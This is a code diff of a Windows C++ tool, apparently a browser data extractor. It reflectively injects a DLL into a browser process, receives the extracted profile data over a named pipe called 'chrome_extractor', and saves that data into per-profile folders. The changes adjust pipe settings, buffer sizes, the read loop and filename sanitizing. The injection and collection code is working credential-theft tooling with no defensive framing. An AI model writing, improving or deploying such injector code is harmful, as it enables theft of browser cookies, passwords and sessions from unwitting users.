@@ -199,9 +199,12 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
         return;
     }
 
-    inject_dll_reflective(pi.hProcess, dll_bytes);
+    HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 2 * 1024 * 1024, 2 * 1024 * 1024, 0, NULL);
+    if (h_pipe == INVALID_HANDLE_VALUE) {
+        std::cerr << "Failed to create named pipe. Error: " << GetLastError() << std::endl;
+    }
 
-    HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 1024 * 1024, 1024 * 1024, 0, NULL);
+    inject_dll_reflective(pi.hProcess, dll_bytes);
     ResumeThread(pi.hThread);
 
     if (h_pipe != INVALID_HANDLE_VALUE) {
@@ -209,17 +212,14 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
         if (ConnectNamedPipe(h_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
             std::cout << "DLL Connected successfully!" << std::endl;
             std::vector<char> buffer;
-            char temp[8192];
+            char temp[65536];
             DWORD bytes_read;
-            while (true) {
-                BOOL res = ReadFile(h_pipe, temp, sizeof(temp), &bytes_read, NULL);
-                if ((res || GetLastError() == ERROR_MORE_DATA) && bytes_read > 0) {
-                    buffer.insert(buffer.end(), temp, temp + bytes_read);
-                    if (res) break;
-                } else break;
+            while (ReadFile(h_pipe, temp, sizeof(temp), &bytes_read, NULL) && bytes_read > 0) {
+                buffer.insert(buffer.end(), temp, temp + bytes_read);
             }
 
             if (!buffer.empty()) {
+                std::cout << "Received " << buffer.size() << " bytes of data." << std::endl;
                 try {
                     auto profiles = json::parse(buffer);
                     fs::path browser_dir(browser.name);
@@ -228,6 +228,11 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                     std::cout << "Parsing JSON data..." << std::endl;
                     for (size_t i = 0; i < profiles.size(); ++i) {
                         std::string p_name = profiles[i]["name"].get<std::string>();
+                        // Sanitize profile name for filesystem
+                        std::replace(p_name.begin(), p_name.end(), '/', '_');
+                        std::replace(p_name.begin(), p_name.end(), '\\', '_');
+                        std::replace(p_name.begin(), p_name.end(), ':', '_');
+
                         fs::path profile_dir = browser_dir / ("profile " + std::to_string(i + 1) + " - " + p_name);
                         fs::create_directories(profile_dir);
 
